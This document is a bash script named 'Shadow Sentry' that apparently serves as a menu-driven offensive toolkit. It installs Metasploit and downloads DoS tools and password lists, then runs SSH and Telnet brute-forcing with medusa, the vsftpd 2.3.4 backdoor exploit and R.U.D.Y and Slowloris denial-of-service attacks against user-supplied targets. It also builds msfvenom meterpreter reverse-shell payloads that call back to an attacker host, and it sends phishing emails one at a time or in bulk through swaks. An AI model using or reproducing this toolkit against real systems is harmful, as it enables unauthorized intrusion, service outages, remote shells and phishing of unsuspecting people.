#!/bin/bash

export PATH=/usr/bin:$PATH

### Text formatting ###

CLEAR="\e[0m"

# Text settings.
BOLD="\e[1m"
UNDERLINE="\e[4m"

# Text color.
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"

# Text color with bold font.
RED_BOLD="\e[1;31m"
GREEN_BOLD="\e[1;32m"
YELLOW_BOLD="\e[1;33m"
BLUE_BOLD="\e[1;34m"
MAGENTA_BOLD="\e[1;35m"
CYAN_BOLD="\e[1;36m"

# Background color.
RED_BG="\e[41m"
GREEN_BG="\e[42m"
YELLOW_BG="\e[43m"
BLUE_BG="\e[44m"
MAGENTA_BG="\e[45m"
CYAN_BG="\e[46m"

# Background color with bold font.
RED_BG_BOLD="\e[1;41m"
GREEN_BG_BOLD="\e[1;42m"
YELLOW_BG_BOLD="\e[1;43m"
BLUE_BG_BOLD="\e[1;44m"
MAGENTA_BG_BOLD="\e[1;45m"
CYAN_BG_BOLD="\e[1;46m"

### End of text formatting ###

# Function to check if resources exist

function check_resources() 
{
	if ! msfconsole -v > /dev/null 2>&1 || [ ! -f "attack_resources/seclist/user.txt" ] || [ ! -f "attack_resources/seclist/pass.txt" ] || [ ! -d "attack_resources/rudy" ]  || [ ! -d "attack_resources/slowloris" ] || [ ! -d "attack_resources" ] || [ ! -d "attack_resources/seclist" ]; then
		
		sleep 3
		echo -e "You will need to install/download some resources to continue...\n"
		pwd > /dev/null
		cur_dir=$(pwd)
		download_resources
		
	else
		
		pwd > /dev/null
		cur_dir=$(pwd)
		sleep 3
		echo -e "YOU ARE GOOD TO GO...\n"
		
	fi
}

# Function to download required resources

function download_resources() 
{
	echo -e "Downloading required resources...\n"
	
	mkdir -p $cur_dir/attack_resources
	cd $cur_dir/attack_resources
	mkdir -p seclist
	
	sudo apt-get install -y metasploit-framework > /dev/null 2>&1
	git clone https://github.com/SergiDelta/rudy.git > /dev/null 2>&1
	git clone https://github.com/gkbrk/slowloris.git > /dev/null 2>&1
	wget -q -O $cur_dir/attack_resources/seclist/user.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
	wget -q -O $cur_dir/attack_resources/seclist/pass.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt
	
	echo -e "Resources downloaded sucessfully and will be save in the attack_resources folder...\n"
}

#Function for attack choice made and bringing the user to the correct function

function AttkChoice()
{
	case $OPTIONS in
	
		1)
			echo -e "Bruteforce Attack chosen... Listing possible methods...\n"
			Brute
		;;
			
		2)
			echo -e "Backdoor access module selected, module starting...\n"
			BackG
		;;
			
		3)
			echo -e "DOS Attack module selected, please choose your DOS method...\n"
			DOSattk
		;;
		
		4)
			echo -e "Payload Creation selected, module starting...\n"
			Payload
		;;
			
		5)
			echo -e "Phishing Email module selected, please enter required information to continue...\n"
			MailPhish
		;;
		
		*)
			echo -e "Invalid choice, please try again...\n"
			AttkChoice
		;;
	esac
}

#Function for bruteforce attacks

function Brute()
{
	echo -e "1.SSH\n2.TELNET\n3.Previous Menu"
	echo -e "Please enter the (#) of the desired bruteforce methods...\n"; read OPTIONS1
	
	
	case $OPTIONS1 in
		
		1)
			echo -e "SSH Bruteforcing selected, module starting...\n"
			echo -e "Specify target's IP:"; read targetip
			Upload
			medusa -h $targetip -U $user_file -P $pass_file -M ssh -n 22 -t 4
			echo -e "Trying to gain access to target...\n"
		;;
		
		2)
			echo -e "Telnet Bruteforcing selected, module starting...\n"
			echo -e "Specify target's IP:"; read targetip
			Upload
			medusa -h $targetip -U $user_file -P $pass_file -M telnet -n 23 -t 4
			echo -e "Trying to gain access to target...\n"
		;;
		
		3)
			SysAttk
			
		;;
		
		*)
			echo -e "Invalid choice, please try again...\n"
			Brute
		;;
	esac
}

#Function for user and password list uploads or defaults

function Upload()
{
	echo -e "\nBruteforcing module requires a USER FILE & a PASSWD FILE to continue the attack...\n"
	echo -e "Do you wish to use the DEFAULT FILE provided or UPLOAD your own files?\n"
	echo -e "1.DEFAULT\n2.UPLOAD\n3.Previous Menu\n"; read UPLOADOPTIONS
			
	case $UPLOADOPTIONS in
	
		1) 
			echo -e "Default files selected, proceeding to bruteforcing target...\n"
			user_file=$cur_dir/attack_resources/seclist/user.txt
			pass_file=$cur_dir/attack_resources/seclist/pass.txt
		;;
			
		2)
			echo -e "Please enter the relative path of the USER file that you will be using..."; read user_file
			echo -e "\nPlease enter the relative path of the PASSWORD file that you will be using..."; read pass_file
			echo -e "\nFiles uploaded, proceeding to bruteforcing target...\n"
		;;
			
		3)
			Brute
		;;
		
		*) 
			echo -e "Invalid choice, please try again...\n"
			Upload
		;;
	esac
}

#Function for Backdoor Attacks

function BackG()
{
	echo -e  "Please choose the background exploit you wish to execute...\n"
	echo -e "1.VSFTPD\n2.Previous Menu\n"; read OPTIONS1
	
	case $OPTIONS1 in
	
		1)
			echo -e "VSFTPD Backdoor module selected... Trying to gain access to target...\n"
			echo -e "Specify target's IP:"; read targetip
			echo -e "\nAccessing target...\n"
			msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $targetip; run; exit"
			BackG
		;;
			
		2)
			SysAttk
		;;
		
		*) 
			echo -e "Invalid choice, please try again...\n"
			BackG
		;;
		
	esac
}

#Function for DOS attack

function DOSattk() 
{
	echo -e "Choose your preferred method of DOS attack:\n"
	echo -e "1.R.U.D.Y\n2.SlowLoris\n3.Previous Menu\n"; read CHOICE1

	case $CHOICE1 in
	
		1)
			echo -e "1.Display info\n2.Proceed with attack\n3.Previous Menu\n"; read CHOICE2

			case $CHOICE2 in
			
				1)
					echo "R.U.D.Y is a type of DoS attack that targets web servers running PHP."
					echo "It sends a malformed POST request with a large Content-Length header, which causes the server to allocate memory for the request body."
					echo -e "By sending multiple requests with large Content-Length headers, the server can be overwhelmed and crash.\n"
					DOSattk
				;;
				
				2)
					echo -e "Enter the target URL:"; read targetip
					cd $cur_dir/attack_resources/rudy && python rudy.py $targetip
					DOSattk
				;;
				
				3)
					DOSattk
				;;
				
				*)
					echo "Invalid choice, please try again"
					DOSattk
				;;
			esac
		;;
		
		2)
			echo -e "1.Display info\n2.Proceed with attack\n3.Previous Menu\n"; read CHOICE2

			case $CHOICE2 in
			
				1)
					echo "Slowloris is a type of DoS attack that targets web servers by keeping many connections open for a long time."
					echo "It sends partial HTTP requests and waits for the server to respond before sending the next request."
					echo -e "By keeping many connections open, the server can be overwhelmed and unable to serve legitimate requests.\n"
					DOSattk
				;;
				
				2)
					echo -e "Enter the target URL:"; read targetip
					cd $cur_dir/attack_resources/slowloris && python slowloris.py $targetip -s 500 -p 80
				;;
				
				3)
					DOSattk
				;;
				
				*)
					echo "Invalid choice, please try again..."
					DOSattk
				;;
			esac
		;;
		
		3)
			SysAttk
		;;
	esac	
}

#Function for Payload Creation, to be use with Phishing attacks

function Payload()
{
	echo -e "1.Windows\n2.Linux\n3.Previous Menu\n"
	echo -e "Please enter the (#) for the target's OS..."; read OPTIONS1
	
	case $OPTIONS1 in
	
		1)
			echo -e "\nWindows Payload Option selected...\n"
			echo -e "Please enter host ip..."; read hostip
			WinPayload
		;;
		
		2)
			echo -e "\nLinux Payload Option selected...\n"
			echo -e "Please enter host ip..."; read hostip
			LinuxPayLoad
		;;
		
		3)
			SysAttk
		;;
			
		*)
			echo -e "Invalid choice, please try again...\n"
			Payload
		;;
	esac
}

#Function for Windows Payloads

function WinPayload()
{
	
	echo -e "\n1.Windows Reverse TCP\n2.Windows Reverse HTTP\n3.Windows Reverse HTTPS\n4.Previous Menu\n"; read OPTIONS2
	
	case $OPTIONS2 in
	
		1) 
			echo -e "Windows Reverse TCP payload selected. Creating payload...\n"
			msfvenom -p windows/meterpreter/reverse_tcp LHOST=$hostip LPORT=4444 -f exe > reverse.exe
			echo -e "Payload created!\n"
		;;
	
		2) 
			echo -e "Windows HTTP Reverse TCP payload selected. Creating payload...\n"
			msfvenom -p windows/meterpreter/reverse_http LHOST=$hostip LPORT=4444 -f exe > reverse.exe
			echo -e "Payload created!\n"
		;;
	
		3) 
			echo -e "Windows HTTPS Reverse TCP payload selected. Creating payload...\n"
			msfvenom -p windows/meterpreter/reverse_https LHOST=$hostip LPORT=4444 -f exe > reverse.exe
			echo -e "Payload created!\n"
		;;
		
		4)
			Payload
		;;	
		
		*)
			echo -e "Invalid choice, please try again...\n"
			WinPayload
		;;
		
	esac
}

#Function for Linux Payload

function LinuxPayLoad()
{
	echo -e "\n1.Linux Reverse TCP\n2.Previous Menu\n";  read OPTIONS2
	
	case $OPTIONS2 in
	
		1) 
			echo -e "Linux Reverse TCP payload selected. Creating payload...\n"
			msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$hostip LPORT=4444 -f elf > reverse.elf
			echo -e "Payload created!\n"
		;;
			
		2)
			Payload
		;;
		
		*)
			echo -e "Invalid choice, please try again...\n"
			LinuxPayLoad
		;;
	esac
}

#Function for Phishing Mail Attacks

function MailPhish()
{
    echo -e "Email Phishing Attack selected... Please choose an options...\n\n1.Single Target\n2.Mass Email Sender\n3.Previous Menu"; read OPTIONS1

    case $OPTIONS1 in

        1)
            echo -e "Single Target Email Phishing selected...\n"
			echo -e "Enter the list of recipients' email addresses (separated by commas): "; read recipients
			echo -e "Enter your email: "; read youremail
			echo -e "Your username :"; read username
			echo -e "Your password :"; read password 
			echo -e "Enter the subject: "; read subject
			echo -e "Enter the body: "; read body
			swaks --to "$recipients" --from "$youremail" --server smtp.gmail.com:587 --auth-user $username --auth-password $password --h-Subject: "$subject" --body "$body"
			
			if [ $? -eq 0 ]; then
					
			echo "Email sent successfully"
						
			else
					
			echo "Error sending email"
						
			fi
		;;

        2)
            echo -e "Mass Email Phishing selected...\n"

			echo -e "Enter the path to the file containing the recipients' email addresses: "; read file_path
			echo -e "Enter your email: "; read youremail
			echo -e "Your username :"; read username
			echo -e "Your password :"; read password 
			echo -e "Enter the subject: "; read subject
			echo -e "Enter the body: "; read body
			swaks --to "$(cat "$file_path")" --from "$youremail" --server smtp.gmail.com:587 --auth-user $username --auth-password $password --h-Subject: "$subject" --body "$body"
			
			if [ $? -eq 0 ]; then
					
			echo "Email sent successfully"
						
			else
					
			echo "Error sending email"
						
			fi
        ;;
		
		3)
		
			SysAttk
		;;
		
		*)
	
        echo -e "Invalid choice, please try again...\n"
        MailPhish
        
        ;;
	esac
}

#Main Function

function SysAttk()
{
	echo -e "\nWELCOME TO SHADOW SENTRY!\n"
	echo -e "Checking if you have the correct resources to run SS!\n"
	check_resources
	echo -e "Below is the possible methods for attacks...\n"
	echo -e "${RED_BOLD}${UNDERLINE}TYPES OF ATTACKS${CLEAR}\n"
	echo -e "1.Bruteforce\n2.Backdoor\n3.Denial Of Service\n4.Payloads Creation\n5.Email Phishing\n"
	echo -e "Please enter the (#) of the desired method to gain access to the target..."; read OPTIONS
	echo -e
	AttkChoice
	
}

SysAttk
